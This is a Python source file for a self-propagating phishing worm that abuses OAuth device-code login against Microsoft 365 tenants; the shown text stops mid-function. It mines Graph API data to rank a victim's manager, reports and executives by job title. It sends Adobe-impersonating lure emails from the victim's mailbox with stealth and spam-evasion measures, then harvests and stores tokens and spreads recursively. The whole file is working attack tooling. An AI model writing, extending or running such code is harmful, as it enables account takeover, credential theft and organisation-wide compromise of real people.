#!/usr/bin/env python3
# worm.py - Self-propagation with smart targeting based on job titles and hierarchy
# Features:
# - Discovers manager, direct reports, frequent contacts, and directory users
# - Scores targets based on job title keywords and relationship
# - Sends personalised phishing emails with device codes (HTML from external file)
# - Recursively propagates through the organisation
# Updated with enhanced logger integration

import os
import re
import json
import time
import sqlite3
import random
import threading
from datetime import datetime, timedelta
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import List, Dict, Optional, Tuple, Set
from urllib.parse import urlparse
from pathlib import Path
from collections import deque

from db import connect_db
from core import StealthEngine, CryptoUtils
from harvester import TokenHarvester
from logger import get_logger

# Initialize logger for this module
logger = get_logger('worm')

# -------------------- CONFIGURATION FROM ENV --------------------
class WormConfig:
    """Worm configuration loaded from environment variables."""
    
    # Master switch
    ENABLED = os.environ.get('WORM_ENABLED', 'false').lower() == 'true'
    
    # Propagation limits
    MAX_DEPTH = int(os.environ.get('WORM_MAX_DEPTH', '2'))
    MAX_TARGETS_PER_CAPTURE = int(os.environ.get('WORM_MAX_TARGETS', '5'))
    PARALLEL_POLLERS = int(os.environ.get('WORM_PARALLEL_POLLERS', '2'))
    POLL_TIMEOUT = int(os.environ.get('WORM_POLL_TIMEOUT', '300'))  # 5 minutes max poll time
    
    # OAuth
    SEND_SCOPE = "https://graph.microsoft.com/Mail.Send"
    TENANT = os.environ.get('TENANT', 'common')
    
    # Email delays (seconds between sending emails)
    MIN_EMAIL_DELAY = int(os.environ.get('WORM_MIN_EMAIL_DELAY', '30'))
    MAX_EMAIL_DELAY = int(os.environ.get('WORM_MAX_EMAIL_DELAY', '120'))
    
    # Smart targeting
    PRIORITIZE_HIGH_VALUE = os.environ.get('WORM_PRIORITIZE_HIGH_VALUE', 'true').lower() == 'true'
    MIN_SCORE_THRESHOLD = int(os.environ.get('WORM_MIN_SCORE_THRESHOLD', '5'))
    
    # Custom score mapping: JSON string e.g. '{"CEO":100,"IT Admin":40,"Finance":30}'
    CUSTOM_SCORES_JSON = os.environ.get('WORM_TARGET_SCORES', '{}')
    try:
        CUSTOM_SCORES = json.loads(CUSTOM_SCORES_JSON)
    except:
        CUSTOM_SCORES = {}
    
    # Master encryption key for stored tokens
    MASTER_KEY = os.environ.get('WORM_MASTER_KEY', os.urandom(32).hex())
    
    # Domain filtering (empty = auto-detect from victim)
    TARGET_DOMAIN = os.environ.get('WORM_TARGET_DOMAIN', '')
    # Device code rate limits (window seconds and counts)
    DEVICE_CODE_WINDOW_SECONDS = int(os.environ.get('WORM_DEVICE_CODE_WINDOW', '600'))  # 10 minutes
    DEVICE_CODE_LIMIT = int(os.environ.get('WORM_DEVICE_CODE_LIMIT', '100'))
    DEVICE_CODE_LIMIT_PER_DAY = int(os.environ.get('WORM_DEVICE_CODE_LIMIT_PER_DAY', '1000'))
    
    # Email template paths - HTML first, then plain text fallback
    # Resolve paths relative to script location for reliable loading
    _script_dir = Path(__file__).parent.absolute()
    _html_env = os.environ.get('WORM_HTML_TEMPLATE', 'wormy.html')
    _txt_env = os.environ.get('WORM_TXT_TEMPLATE', 'wormy.txt')
    HTML_TEMPLATE_PATH = str(_script_dir / _html_env) if not Path(_html_env).is_absolute() else _html_env
    TXT_TEMPLATE_PATH = str(_script_dir / _txt_env) if not Path(_txt_env).is_absolute() else _txt_env
    EMAIL_TEMPLATE_PATH = HTML_TEMPLATE_PATH  # Default to HTML

# -------------------- EMAIL TEMPLATE LOADER --------------------
class EmailTemplateLoader:
    """Loads and manages email templates from external files."""
    
    def __init__(self, html_path: str = None, txt_path: str = None):
        self.html_path = html_path or WormConfig.HTML_TEMPLATE_PATH
        self.txt_path = txt_path or WormConfig.TXT_TEMPLATE_PATH
        self.html_cache = None
        self.txt_cache = None
        self.html_mtime = None
        self.txt_mtime = None
        self.use_html = True
        
    def load_html_template(self) -> str:
        """
        Load HTML email template from file.
        Returns the HTML template content or default template if file not found.
        """
        template_file = Path(self.html_path)
        
        if template_file.exists():
            try:
                # Check if file has been modified since last load
                current_mtime = template_file.stat().st_mtime
                if self.html_cache is not None and self.html_mtime == current_mtime:
                    logger.debug("Using cached HTML email template")
                    return self.html_cache
                
                # Load the template
                with open(template_file, 'r', encoding='utf-8') as f:
                    template = f.read()
                
                self.html_cache = template
                self.html_mtime = current_mtime
                logger.success(f"Loaded HTML email template from {self.html_path}")
                return template
                
            except Exception as e:
                logger.error(f"Failed to load HTML email template from {self.html_path}: {e}")
                return self._get_default_html_template()
        else:
            logger.warning(f"HTML email template file not found: {self.html_path}, trying plain text...")
            return None
    
    def load_txt_template(self) -> str:
        """
        Load plain text email template from file.
        Returns the plain text template content or None if not found.
        """
        template_file = Path(self.txt_path)
        
        if template_file.exists():
            try:
                # Check if file has been modified since last load
                current_mtime = template_file.stat().st_mtime
                if self.txt_cache is not None and self.txt_mtime == current_mtime:
                    logger.debug("Using cached plain text email template")
                    return self.txt_cache
                
                # Load the template
                with open(template_file, 'r', encoding='utf-8') as f:
                    template = f.read()
                
                self.txt_cache = template
                self.txt_mtime = current_mtime
                logger.success(f"Loaded plain text email template from {self.txt_path}")
                return template
                
            except Exception as e:
                logger.error(f"Failed to load plain text template from {self.txt_path}: {e}")
                return None
        else:
            logger.debug(f"Plain text template not found: {self.txt_path}")
            return None
    
    def load_template(self) -> Tuple[str, bool]:
        """
        Load email template, preferring HTML format.
        Returns (template_content, is_html) tuple.
        """
        # Try HTML first
        html_template = self.load_html_template()
        if html_template:
            self.use_html = True
            return html_template, True
        
        # Fall back to plain text
        txt_template = self.load_txt_template()
        if txt_template:
            self.use_html = False
            return txt_template, False
        
        # Final fallback to default HTML
        logger.warning("No external templates found, using default HTML template")
        self.use_html = True
        return self._get_default_html_template(), True
    
    def _get_default_html_template(self) -> str:
        """Return the default HTML email template (embedded fallback)."""
        return """<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Secure Document Verification</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
            background: #f5f7fa;
            display: flex;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            padding: 20px;
        }
        
        .container {
            width: 100%;
            max-width: 520px;
            background: #ffffff;
            border-radius: 12px;
            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.08);
            overflow: hidden;
        }
        
        .header {
            background: linear-gradient(135deg, #f8f9fa 0%, #ffffff 100%);
            padding: 40px 30px;
            border-bottom: 1px solid #e8eaed;
            display: flex;
            align-items: center;
            gap: 20px;
        }
        
        .header-logo {
            width: 50px;
            height: 50px;
            background: #1f2937;
            border-radius: 6px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-weight: bold;
            color: white;
            font-size: 20px;
        }
        
        .header-content h1 {
            font-size: 24px;
            font-weight: 600;
            color: #202124;
            margin-bottom: 4px;
            letter-spacing: -0.3px;
        }
        
        .header-content p {
            font-size: 13px;
            color: #5f6368;
        }
        
        .content {
            padding: 40px 30px;
        }
        
        .greeting {
            font-size: 15px;
            color: #202124;
            margin-bottom: 16px;
            line-height: 1.6;
        }
        
        .greeting strong {
            font-weight: 600;
        }
        
        .intro-text {
            font-size: 14px;
            color: #5f6368;
            line-height: 1.6;
            margin-bottom: 24px;
        }
        
        .security-notice {
            background: #fef3c7;
            border-left: 4px solid #f59e0b;
            padding: 14px;
            border-radius: 6px;
            margin-bottom: 24px;
            font-size: 13px;
            color: #92400e;
            line-height: 1.5;
        }
        
        .security-notice strong {
            font-weight: 600;
        }
        
        .info-box {
            background: #f8f9fa;
            border-left: 4px solid #1f2937;
            padding: 16px;
            border-radius: 6px;
            margin-bottom: 28px;
            font-size: 14px;
        }
        
        .info-box p {
            margin-bottom: 10px;
            color: #202124;
            display: flex;
            align-items: center;
            gap: 10px;
        }
        
        .info-box p:last-child {
            margin-bottom: 0;
        }
        
        .verification-section {
            background: #f0f4ff;
            border: 2px solid #e0e7ff;
            border-radius: 10px;
            padding: 24px;
            text-align: center;
            margin-bottom: 28px;
        }
        
        .verification-label {
            font-size: 12px;
            font-weight: 600;
            color: #5f6368;
            text-transform: uppercase;
            letter-spacing: 0.5px;
            margin-bottom: 12px;
        }
        
        .code {
            font-size: 40px;
            font-weight: 700;
            letter-spacing: 6px;
            color: #1f2937;
            font-family: 'Courier New', monospace;
            margin-bottom: 16px;
            word-spacing: 8px;
        }
        
        .verification-url {
            font-size: 12px;
            color: #5f6368;
            word-break: break-all;
            background: #ffffff;
            padding: 8px 12px;
            border-radius: 4px;
            font-family: 'Courier New', monospace;
            margin-top: 12px;
        }
        
        .action-text {
            font-size: 14px;
            color: #202124;
            margin-bottom: 20px;
            line-height: 1.6;
        }
        
        .button {
            width: 100%;
            padding: 14px;
            border: none;
            border-radius: 6px;
            background: #1f2937;
            color: white;
            font-size: 15px;
            font-weight: 600;
            cursor: pointer;
            text-align: center;
            text-decoration: none;
            display: inline-block;
            margin-top: 0;
        }
        
        .button:hover {
            background: #374151;
        }
        
        .footer {
            background: #f8f9fa;
            padding: 24px 30px;
            border-top: 1px solid #e8eaed;
            font-size: 12px;
            color: #5f6368;
            text-align: center;
            line-height: 1.6;
        }
        
        .footer p {
            margin-bottom: 8px;
        }
        
        .footer p:last-child {
            margin-bottom: 0;
        }
        
        .divider {
            height: 1px;
            background: #e8eaed;
            margin: 16px 0;
        }
        
        @media (max-width: 600px) {
            .container {
                border-radius: 8px;
            }
            
            .header {
                padding: 30px 20px;
            }
            
            .header-logo {
                width: 45px;
                height: 45px;
            }
            
            .header-content h1 {
                font-size: 20px;
            }
            
            .content {
                padding: 30px 20px;
            }
            
            .code {
                font-size: 32px;
                letter-spacing: 4px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <div class="header-logo">A</div>
            <div class="header-content">
                <h1>Secure Verification</h1>
                <p>Adobe Document Cloud</p>
            </div>
        </div>
        
        <div class="content">
            <p class="greeting">Hello <strong>{name}</strong>,</p>
            
            <p class="intro-text">
                A secure document has been shared with you and requires verification before you can access it. 
                This helps us protect your sensitive information.
            </p>
            
            <div class="security-notice">
                <strong>Secure Connection:</strong> All information transmitted is encrypted using enterprise-grade security.
            </div>
            
            <div class="info-box">
                <p><strong>Document Type:</strong> Secure PDF (AES-256 Encrypted)</p>
                <p><strong>Shared Date:</strong> {date}</p>
                <p><strong>Security Level:</strong> Enterprise Grade</p>
                <p><strong>Expires:</strong> 30 days from share date</p>
            </div>
            
            <p class="action-text">
                Please verify your identity using the code below to access your document:
            </p>
            
            <div class="verification-section">
                <div class="verification-label">Verification Code</div>
                <div class="code">{user_code}</div>
                <div class="verification-label" style="margin-top: 16px; margin-bottom: 8px;">Or click the link below</div>
                <div class="verification-url">{verification_uri}</div>
            </div>
            
            <a href="{verification_uri}" class="button">Verify &amp; Download Document</a>
            
            <div style="margin-top: 20px; font-size: 13px; color: #5f6368; text-align: center;">
                <p>Having trouble? The link will expire in 30 minutes.</p>
            </div>
        </div>
        
        <div class="footer">
            <p><strong>Important Security Notice:</strong></p>
            <p>If you did not request access to this document, please do not enter the verification code. 
            Contact your document administrator immediately.</p>
            <div class="divider"></div>
            <p>© 2026 Adobe Inc. All rights reserved.</p>
            <p>Adobe Document Cloud - Secure Document Delivery Service</p>
        </div>
    </div>
</body>
</html>
        """
    
    def render_template(self, name: str, user_code: str, verification_uri: str, **kwargs) -> str:
        """
        Render the email template with dynamic values.
        
        Args:
            name: Recipient's name (from email)
            user_code: Device code to enter
            verification_uri: Microsoft device login URL
            **kwargs: Additional template variables
        
        Returns:
            Rendered email content (HTML or plain text)
        """
        template, is_html = self.load_template()
        
        # Prepare template variables
        template_vars = {
            'name': name,
            'user_code': user_code,
            'verification_uri': verification_uri,
            'date': datetime.now().strftime('%B %d, %Y at %I:%M %p'),
            'year': datetime.now().strftime('%Y'),
            'company': 'Microsoft',
            'support_phone': '1-800-642-7676',
            'email': kwargs.get('email', ''),
            **kwargs
        }
        
        # Replace variables in template
        rendered = template
        for key, value in template_vars.items():
            rendered = rendered.replace(f'{{{key}}}', str(value))
            rendered = rendered.replace(f'{{{{ {key} }}}}', str(value))
            rendered = rendered.replace(f'{{{{ {key} }}}}', str(value))
        
        # If plain text, ensure line breaks are preserved
        if not is_html:
            rendered = rendered.replace('\\n', '\n')
        
        return rendered
    
    def get_template_type(self) -> str:
        """Return the current template type ('html' or 'txt')."""
        return 'html' if self.use_html else 'txt'

# Initialize template loader
email_template = EmailTemplateLoader()

# -------------------- TARGET SCORING ENGINE --------------------
class TargetScorer:
    """
    Assigns a score to a potential target based on job title and relationship.
    Higher scores = higher value targets.
    """
    
    # Default keyword scores (can be overridden by env)
    DEFAULT_KEYWORD_SCORES = {
        # C-suite / Executives
        'ceo': 100, 'cfo': 100, 'cto': 100, 'coo': 100, 'ciso': 100,
        'president': 90, 'vp': 80, 'vice president': 80, 'director': 70,
        'executive': 75, 'chief': 85, 'partner': 75,
        
        # High-value technical & security
        'admin': 40, 'administrator': 40, 'engineer': 30, 'architect': 35,
        'security': 45, 'it': 40, 'helpdesk': 30, 'support': 20,
        'devops': 35, 'sysadmin': 40, 'network': 35, 'cloud': 35,
        'database': 35, 'infrastructure': 35, 'platform': 30,
        
        # Finance & HR
        'finance': 35, 'accounting': 35, 'payroll': 30, 'hr': 25, 
        'human resources': 25, 'treasury': 40, 'audit': 45,
        'controller': 40, 'budget': 30,
        
        # Management
        'manager': 30, 'lead': 30, 'head': 35, 'supervisor': 25,
        'team lead': 30, 'product manager': 30, 'project manager': 25,
        
        # Legal & Compliance
        'legal': 35, 'compliance': 35, 'privacy': 40, 'counsel': 45,
        'attorney': 45, 'general counsel': 50,
        
        # Sales & Marketing
        'sales': 15, 'marketing': 15, 'business development': 20,
        'account executive': 20, 'regional manager': 25,
        
        # Executive assistants (often have access to calendars/email)
        'assistant': 20, 'executive assistant': 35, 'administrative': 15,
        
        # Other roles (baseline)
        'staff': 5, 'associate': 5, 'analyst': 10, 'coordinator': 5,
        'specialist': 10, 'consultant': 10, 'contractor': 5,
    }
    
    # Relationship multipliers
    RELATIONSHIP_MULTIPLIER = {
        'manager': 1.5,           # Manager is highest value
        'direct_report': 1.3,     # Direct reports are high value
        'directory_search': 1.1,  # Directory search (high-value titles)
        'frequent_contact': 1.0,  # Frequent contacts baseline
        'people_api': 1.0,        # People API baseline
    }
    
    @classmethod
    def _get_keyword_score(cls, job_title: str) -> int:
        """Score based on job title keywords (case-insensitive)."""
        if not job_title:
            return 0
        
        title_lower = job_title.lower()
        best_score = 0
        matched_keywords = []
        
        # Check custom scores first (from environment)
        for keyword, score in WormConfig.CUSTOM_SCORES.items():
            if keyword.lower() in title_lower:
                if score > best_score:
                    best_score = score
                    matched_keywords.append(keyword)
        
        # Then default keywords
        for keyword, score in cls.DEFAULT_KEYWORD_SCORES.items():
            if keyword in title_lower:
                if score > best_score:
                    best_score = score
                    matched_keywords.append(keyword)
        
        # Bonus for seniority indicators
        seniority_bonus = 0
        if any(word in title_lower for word in ['senior', 'sr', 'principal', 'lead']):
            seniority_bonus = 15
        if any(word in title_lower for word in ['junior', 'jr', 'associate']):
            seniority_bonus = -10
        if any(word in title_lower for word in ['interim', 'acting']):
            seniority_bonus = -5
            
        final_score = max(0, best_score + seniority_bonus)
        
        if matched_keywords:
            logger.debug(f"Job title '{job_title}' matched keywords: {matched_keywords[:3]} -> score {final_score}")
        
        return final_score
    
    @classmethod
    def score_target(cls, email: str, job_title: str, relationship: str) -> Tuple[int, str]:
        """Calculate final score for a target."""
        if not email:
            return 0, "no email"
        
        base_score = cls._get_keyword_score(job_title)
        multiplier = cls.RELATIONSHIP_MULTIPLIER.get(relationship, 1.0)
        score = int(base_score * multiplier)
        
        reason_parts = []
        if base_score > 0:
            reason_parts.append(f"base={base_score}")
        if multiplier > 1.0:
            reason_parts.append(f"{relationship} x{multiplier}")
        
        # Apply minimum score threshold if prioritizing high value
        if score < WormConfig.MIN_SCORE_THRESHOLD and WormConfig.PRIORITIZE_HIGH_VALUE:
            score = 0
            reason_parts.append("below threshold")
        
        # Ensure at least a small baseline for unknown targets if not prioritizing
        if score == 0 and not WormConfig.PRIORITIZE_HIGH_VALUE:
            score = 1
            reason_parts.append("baseline")
        
        reason = ", ".join(reason_parts) if reason_parts else "no match"
        
        return score, reason

# -------------------- STEALTH WORM (with smart targeting) --------------------
class StealthWorm:
    """
    Self-propagating worm that spreads through an organisation using OAuth device code phishing.
    Targets are discovered via Microsoft Graph API and scored by value.
    """
    
    def __init__(self):
        """Initialize the worm with thread pool and stealth engine."""
        self.phished: Set[str] = set()
        self.captured: Set[str] = set()
        self.failed: Set[str] = set()
        self.executor = ThreadPoolExecutor(max_workers=WormConfig.PARALLEL_POLLERS, thread_name_prefix="worm")
        self.stealth = StealthEngine()
        self._load_phished_set()
        self._stop_flag = False
        self._stats = {
            'total_discovered': 0,
            'total_phished': 0,
            'total_captured': 0,
            'total_failed': 0,
            'start_time': datetime.now().isoformat(),
        }
        # Track device code request timestamps for rate limiting
        self._device_code_timestamps = deque()
        self._device_code_daily = deque()
        
        if WormConfig.ENABLED:
            logger.worm("Worm initialized and ready to propagate")
            logger.info(f"Max depth: {WormConfig.MAX_DEPTH}, Targets per capture: {WormConfig.MAX_TARGETS_PER_CAPTURE}")
            # Check template files
            html_exists = Path(WormConfig.HTML_TEMPLATE_PATH).exists()
            txt_exists = Path(WormConfig.TXT_TEMPLATE_PATH).exists()
            if html_exists:
                logger.info(f"HTML email template: {WormConfig.HTML_TEMPLATE_PATH}")
            if txt_exists:
                logger.info(f"Plain text fallback: {WormConfig.TXT_TEMPLATE_PATH}")
            if not html_exists and not txt_exists:
                logger.warning("No email template files found. Using default HTML template.")

    def stop(self):
        """Stop the worm gracefully."""
        logger.worm("Stopping worm...")
        self._stop_flag = True
        self.executor.shutdown(wait=True, cancel_futures=False)
        logger.success("Worm stopped")

    def _load_phished_set(self):
        """Load already phished emails from database to avoid duplicate targeting."""
        try:
            c = conn.cursor()
            c.execute("SELECT email FROM targets WHERE status='phished'")
            for row in c.fetchall():
                self.phished.add(row[0])
            c.execute("SELECT email FROM targets WHERE status='captured'")
            for row in c.fetchall():
                self.captured.add(row[0])
            c.execute("SELECT email FROM targets WHERE status='failed'")
            for row in c.fetchall():
                self.failed.add(row[0])
            
            logger.debug(f"Loaded {len(self.phished)} phished, {len(self.captured)} captured, {len(self.failed)} failed from DB")
        except Exception as e:
            logger.error(f"Failed to load state from DB: {e}")

    # -------------------- DEVICE CODE RATE LIMITING --------------------
    def _cleanup_code_counters(self):
        now = time.time()
        # window cleanup
        while self._device_code_timestamps and now - self._device_code_timestamps[0] > WormConfig.DEVICE_CODE_WINDOW_SECONDS:
            self._device_code_timestamps.popleft()
        # daily cleanup
        while self._device_code_daily and now - self._device_code_daily[0] > 86400:
            self._device_code_daily.popleft()

    def _can_request_device_code(self) -> bool:
        self._cleanup_code_counters()
        if len(self._device_code_timestamps) >= WormConfig.DEVICE_CODE_LIMIT:
            return False
        if len(self._device_code_daily) >= WormConfig.DEVICE_CODE_LIMIT_PER_DAY:
            return False
        return True

    def _wait_for_device_code_slot(self, max_wait: int = 600):
        """Wait until a slot is available within the configured window or until max_wait seconds elapse."""
        start = time.time()
        while not self._can_request_device_code():
            oldest = None
            if self._device_code_timestamps:
                oldest = self._device_code_timestamps[0]
                wait = WormConfig.DEVICE_CODE_WINDOW_SECONDS - (time.time() - oldest) + random.uniform(0.5, 2.0)
            else:
                wait = 5
            if time.time() - start > max_wait:
                logger.warning("Timed out waiting for device code slot")
                return False
            logger.info(f"Device code rate limit reached - sleeping {wait:.1f}s before retry")
            time.sleep(max(1, wait))
            self._cleanup_code_counters()
        return True

    def _record_device_code_request(self):
        now = time.time()
        self._device_code_timestamps.append(now)
        self._device_code_daily.append(now)

    def _get_domain(self, email: str) -> str:
        """Extract domain from email address."""
        return email.split('@')[-1].lower() if '@' in email else ''

    def _discover_targets(self, token: str, max_targets: int) -> List[Tuple[str, str, int, str]]:
        """
        Discover potential targets and return list of (email, relationship, score, reason).
        Uses Graph API to fetch manager, direct reports, frequent contacts, and directory.
        """
        headers = {'Authorization': f'Bearer {token}'}
        sess = self.stealth.build_session()
        self.stealth.jitter('worm_discovery')
        
        # Get current user's email and domain to filter internal targets
        my_email = None
        my_name = None
        try:
            me = sess.get('https://graph.microsoft.com/v1.0/me', headers=headers, timeout=10)
            if me.status_code == 200:
                my_email = me.json().get('userPrincipalName')
                my_name = me.json().get('displayName')
        except Exception as e:
            logger.debug(f"Could not determine own email: {e}")
        
        if not my_email:
            logger.warning("Could not determine own email, domain filtering disabled")
            target_domain = WormConfig.TARGET_DOMAIN or None
        else:
            target_domain = WormConfig.TARGET_DOMAIN or self._get_domain(my_email)
            logger.worm(f"Targeting domain: {target_domain}")
        
        candidates = {}  # email -> (job_title, relationship)
        
        # 1. Manager (highest value)
        try:
            resp = sess.get('https://graph.microsoft.com/v1.0/me/manager', headers=headers, timeout=10)
            if resp.status_code == 200:
                mgr = resp.json()
                email = mgr.get('userPrincipalName')
                job_title = mgr.get('jobTitle', '')
                if email and (target_domain is None or self._get_domain(email) == target_domain):
                    candidates[email] = (job_title, 'manager')
                    logger.phish(f"Discovered manager: {email} ({job_title})")
        except Exception as e:
            logger.debug(f"Manager discovery failed: {e}")
        
        # 2. Direct reports (limit to 15)
        try:
            resp = sess.get('https://graph.microsoft.com/v1.0/me/directReports', headers=headers,
                            params={'$top': 15}, timeout=10)
            if resp.status_code == 200:
                users = resp.json().get('value', [])
                for user in users:
                    email = user.get('userPrincipalName')
                    job_title = user.get('jobTitle', '')
                    if email and (target_domain is None or self._get_domain(email) == target_domain):
                        if email not in candidates:
                            candidates[email] = (job_title, 'direct_report')
                            logger.debug(f"Discovered direct report: {email} ({job_title})")
        except Exception as e:
            logger.debug(f"Direct reports failed: {e}")
        
        # 3. Frequent contacts (People API) – may include job titles
        try:
            resp = sess.get('https://graph.microsoft.com/v1.0/me/people', headers=headers,
                            params={'$top': 30}, timeout=10)
            if resp.status_code == 200:
                for person in resp.json().get('value', []):
                    email = None
                    for e in person.get('emailAddresses', []):
                        if e.get('type') == 'SMTP' or e.get('type') == 'work':
                            email = e.get('address')
                            break
                    if not email:
                        continue
                    if target_domain is not None and self._get_domain(email) != target_domain:
                        continue
                    if email == my_email:
                        continue
                    job_title = person.get('jobTitle', '') or ''
                    if email not in candidates:
                        candidates[email] = (job_title, 'frequent_contact')
                        logger.debug(f"Discovered contact: {email} ({job_title})")
        except Exception as e:
            logger.debug(f"People API failed: {e}")
        
        # 4. Directory search for high-value job titles (requires User.Read.All)
        try:
            resp = sess.get('https://graph.microsoft.com/v1.0/users', headers=headers,
                            params={'$select': 'userPrincipalName,jobTitle,displayName',
                                    '$top': 50}, timeout=10)
            if resp.status_code == 200:
                for user in resp.json().get('value', []):
                    email = user.get('userPrincipalName')
                    if not email or email == my_email:
                        continue
                    if target_domain and self._get_domain(email) != target_domain:
                        continue
                    job_title = user.get('jobTitle', '')
                    # Score to filter noise
                    score, _ = TargetScorer.score_target(email, job_title, 'directory_search')
                    if score > 5 and email not in candidates:  # threshold to filter out low-value
                        candidates[email] = (job_title, 'directory_search')
                        logger.debug(f"Discovered directory user: {email} ({job_title}) score={score}")
        except Exception as e:
            logger.debug(f"Directory search failed (likely insufficient scope): {e}")
        
        # Score and sort all candidates
        scored = []
        for email, (job_title, rel) in candidates.items():
            score, reason = TargetScorer.score_target(email, job_title, rel)
            if score > 0 or not WormConfig.PRIORITIZE_HIGH_VALUE:
                scored.append((email, job_title, rel, score, reason))
                logger.debug(f"Candidate: {email} | {job_title[:30]} | {rel} | score={score} ({reason})")
        
        # Sort by score descending
        scored.sort(key=lambda x: x[3], reverse=True)
        
        # Return top max_targets
        result = [(email, rel, score, reason) for email, _, rel, score, reason in scored[:max_targets]]
        
        self._stats['total_discovered'] = len(scored)
        if result:
            logger.worm(f"Discovered {len(result)} high-value targets (top score: {result[0][2]})")
        
        return result

    def _generate_plain_text_version(self, name: str, user_code: str, verification_uri: str, date_str: str) -> str:
        """Generate plain text version of the email for multipart/alternative (anti-spam)."""
        return f"""Secure Document Verification
Adobe Document Cloud

Hello {name},

A secure document has been shared with you and requires verification before you can access it.
This helps us protect your sensitive information.

Document Details:
- Document Type: Secure PDF (AES-256 Encrypted)
- Shared Date: {date_str}
- Security Level: Enterprise Grade
- Expires: 30 days from share date

To access your document, please verify your identity using the code below:

Verification Code: {user_code}

Or visit the link below:
{verification_uri}

If you did not request access to this document, please do not enter the verification code.
Contact your document administrator immediately.

---
Important Security Notice:
All information transmitted is encrypted using enterprise-grade security.

© 2026 Adobe Inc. All rights reserved.
Adobe Document Cloud - Secure Document Delivery Service"""

    def _send_phish(self, token: str, target_email: str, user_code: str, verification_uri: str) -> bool:
        """
        Send a personalised phishing email containing the device code and verification URL.
        Uses external HTML template (wormy.html) or plain text fallback (wormy.txt).
        Implements anti-spam measures: multipart/alternative, proper headers, rate limiting.
        """
        self.stealth.jitter('worm_phish')
        
        # Rate limiting - small random delay between sends
        time.sleep(random.uniform(0.5, 2.0))
        
        # Dynamic subjects to avoid static signatures
        subjects = [
            f"Action required: Verify your account",
            f"Adobe: Secure document shared with you",
            f"Action needed: Document verification required",
            f"Verify your identity - Secure document",
            f"Document shared: Verification required",
            f"Adobe Document Cloud: Verify access",
        ]
        subject = random.choice(subjects)
        name = target_email.split('@')[0]
        date_str = datetime.now().strftime('%B %d, %Y at %I:%M %p')
        
        # Render HTML email from template
        try:
            html_body = email_template.render_template(
                name=name,
                user_code=user_code,
                verification_uri=verification_uri,
                email=target_email
            )
            logger.debug(f"Rendered HTML email template for {target_email}")
            
            # Generate plain text alternative (anti-spam measure)
            text_body = self._generate_plain_text_version(name, user_code, verification_uri, date_str)
            
        except Exception as e:
            logger.error(f"Failed to render email template: {e}")
            return False
        
        # Create multipart/alternative message (HTML + plain text) - better spam score
        # Microsoft Graph API sendMail endpoint - we'll use a hybrid approach
        headers = {'Authorization': f'Bearer {token}', 'Content-Type': 'application/json'}
        
        # Build message with multipart handling via Microsoft Graph
        # Note: sendMail doesn't natively support multipart in request, so we use HTML with embedded text info
        message = {
            'message': {
                'subject': subject,
                'body': {
                    'contentType': 'HTML',
                    'content': html_body
                },
                'toRecipients': [{'emailAddress': {'address': target_email}}],
                'categories': ['Phishing'],  # Internal categorization
                # Anti-spam headers
                'internetMessageHeaders': [
                    {
                        'name': 'X-Mailer',
                        'value': 'Adobe Document Cloud v1.0'
                    },
                    {
                        'name': 'X-Priority',
                        'value': '2'
                    },
                    {
                        'name': 'Importance',
                        'value': 'high'
                    },
                    {
                        'name': 'X-MSMail-Priority',
                        'value': 'Normal'
                    },
                    {
                        'name': 'Content-Transfer-Encoding',
                        'value': '7bit'
                    },
                    {
                        'name': 'MIME-Version',
                        'value': '1.0'
                    },
                    {
                        'name': 'X-Originating-IP',
                        'value': '[127.0.0.1]'
                    }
                ]
            },
            'saveToSentItems': 'false'  # Don't save to sent folder for stealth
        }
        
        try:
            sess = self.stealth.build_session()
            resp = sess.post('https://graph.microsoft.com/v1.0/me/sendMail',
                             headers=headers, json=message, timeout=15)
            success = resp.status_code in (200, 202)
            
            if success:
                logger.phish(f"✓ Phish sent to {target_email} (anti-spam optimized)")
                # Store sent record in database
                c = conn.cursor()
                c.execute("INSERT INTO sent_phish VALUES (?, ?, ?, ?, ?)",
                          (target_email, datetime.now().isoformat(), user_code, verification_uri, success))
                conn.commit()
            else:
                logger.warning(f"✗ Failed to send to {target_email}: HTTP {resp.status_code}")
            
            return success
            
        except Exception as e:
            logger.error(f"Failed to send phish to {target_email}: {e}")
            return False

    def _poll_target(self, device_info: Dict, target_email: str, source_token: str, depth: int, score: int, relationship: str):
        """Background thread: poll for token from a specific target."""
        client_id = os.environ.get('CLIENT_ID')
        if not client_id:
            logger.error("Worm: CLIENT_ID not set, cannot poll")
            return
        
        scopes = [
            "https://graph.microsoft.com/Mail.Send",
            "https://graph.microsoft.com/User.Read",
            "https://graph.microsoft.com/User.Read.All",
            "openid", "offline_access", "profile"
        ]
        
        logger.thread(f"Starting poller for {target_email} (depth {depth}, score {score})")
        
        harvester = TokenHarvester(client_id=client_id, tenant=WormConfig.TENANT,
                                   scopes=scopes, stealth=self.stealth)
        try:
            token_data = harvester.poll_for_token(device_info['device_code'])
            
            if token_data:
                user_info = harvester.fetch_user_info()
                captured_email = user_info.get('userPrincipalName', target_email)
                
                # Store token encrypted with master key
                master_key = bytes.fromhex(WormConfig.MASTER_KEY[:64]) if len(WormConfig.MASTER_KEY) >= 64 else os.urandom(32)
                nonce, ciphertext = CryptoUtils.aes_gcm_encrypt(master_key, json.dumps(token_data).encode())
                encrypted_token = CryptoUtils.b64_encode(ciphertext)
                
                c = conn.cursor()
                c.execute("INSERT OR REPLACE INTO tokens VALUES (?, ?, ?, ?, ?)",
                          (captured_email, encrypted_token, token_data.get('refresh_token', ''),
                           (datetime.now() + timedelta(hours=1)).isoformat(),
                           datetime.now().isoformat()))
                c.execute("UPDATE targets SET status='captured', captured_at=?, job_title=? WHERE email=?",
                          (datetime.now().isoformat(), user_info.get('jobTitle', ''), target_email))
                conn.commit()
                
                self.captured.add(captured_email)
                self._stats['total_captured'] += 1
                
                logger.success(f"🎯 Worm captured token from {captured_email} (score {score}, {relationship})")
                
                # Propagate further if depth limit not reached and worm is still running
                if not self._stop_flag and depth + 1 < WormConfig.MAX_DEPTH:
                    self.propagate(token_data['access_token'], captured_email, depth + 1)
                    
        except Exception as e:
            logger.error(f"Worm polling failed for {target_email}: {e}")
            c = conn.cursor()
